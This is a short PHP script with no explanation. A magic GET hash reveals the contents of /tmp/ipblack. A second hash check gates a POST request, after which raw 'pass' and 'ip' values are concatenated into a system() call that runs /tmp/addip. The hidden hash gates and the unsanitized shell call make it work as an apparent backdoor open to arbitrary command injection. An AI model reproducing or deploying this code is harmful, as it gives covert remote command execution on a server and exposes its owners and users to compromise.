<?php
$ipblack = file_get_contents("/tmp/ipblack");

if (md5($_GET['hh']) === '1d5bdbd60b7e975a3d289fb79b9949b1')
{
    echo $ipblack;
}

if (md5($_POST['p']) !== "5614485d47236d9892e63dff517f978d")
{
    die();
}


if (isset($_POST['ip']))
{
    if (strpos($ipblack, $_POST['ip']) !== false)
    {
        die();
    }
    $cmd = "/tmp/addip {$_POST['pass']} {$_POST['ip']}";
    #echo $cmd;
    system($cmd);
}

